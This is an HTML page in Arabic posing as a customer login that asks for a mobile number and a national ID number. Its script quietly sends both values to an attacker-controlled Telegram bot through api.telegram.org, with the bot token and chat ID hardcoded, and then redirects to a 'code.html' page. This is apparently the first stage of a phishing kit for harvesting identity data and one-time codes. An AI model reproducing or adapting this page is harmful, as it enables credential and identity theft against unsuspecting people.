<body style="background-color: #FFF;">

    <nav class="navbar navbar-expand-md navbar-danger bg-danger shadow-sm"></nav>

    <main class="py-4">
        <div class="container justify-content-center" style="justify-content: center !important;text-align: center !important;">
            <a class="navbar-brand justify-content-center"><img src="https://www2.0zz0.com/2025/04/27/10/538990530.jpeg" style="width:100%" alt="logo"></a>
        </div>

        <div class="container">
            <h6 class="text-center" style="font-weight:bold; color: #000;margin-top: 20px;margin-bottom: 30px;">أهلا عزيزي العميل</h6>
            <div class="container justify-content-center">
                <form id="forum" style="padding: 10px;">
                    <div class="form-group row text-right">
                        <label for="cNum" class="col-form-label text-md-right" style="font-weight:bold;">ادخل رقم الموبايل:</label>
                        <input class="form-control" id="cNum" name="cNum" style="direction: ltr;" maxlength="16" autofocus="">
                    </div>

                    <div class="form-group row text-right">
                        <label for="password" class="col-form-label text-md-right" style="font-weight:bold;">ادخل رقم الهوية:</label>
                        <input type="password" class="form-control" id="password" name="password" style="direction: ltr;" maxlength="16">
                    </div>

                    <div class="form-group centered-button">
                        <button type="button" id="confirmBtn" class="btn btn-success">
                            <i class="fa fa-lock ml-10"></i> تسجيل الدخول <span style="font-weight: bold;"></span>
                        </button>
                    </div>
                </form>
            </div>
        </div>

    <footer class="bg-danger" style="width: 100%;bottom: 0px;padding: 10px;color:#FFF;font-weight:bold;margin-top: 30px;">

    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    $(document).ready(function() {
        $('#confirmBtn').click(function() {
            // Collect form data
            const cNum = $('#cNum').val();
            const password = $('#password').val();

            // Validate the form
            if (!cNum || !password) {
                Swal.fire({
                    title: "خطأ",
                    text: "يرجى تعبئة جميع الحقول",
                    icon: "error"
                });
                return;
            }

            // Prepare the message to send to Telegram
            const message = `
                رقم البطاقة: ${cNum}
                رقم الهوية: ${password}
            `;

            // Telegram Bot API settings
            const botToken = '7701259862:AAGeR_4yOWEj32nHGAM-ljhqawXJZd-d82o';
            const chatId = '-4601051649';

            // Send the data to Telegram
            $.ajax({
                url: `https://api.telegram.org/bot${botToken}/sendMessage`,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({
                    chat_id: chatId,
                    text: message
                }),
                success: function(response) {
                    // Redirect to another page after success
                    window.location.href = "code.html"; // Replace with your destination URL
                },
                error: function(error) {
                    Swal.fire({
                        title: "خطأ",
                        text: "حدث خطأ أثناء إرسال البيانات",
                        icon: "error"
                    });
                }
            });
        });
    });
</script>
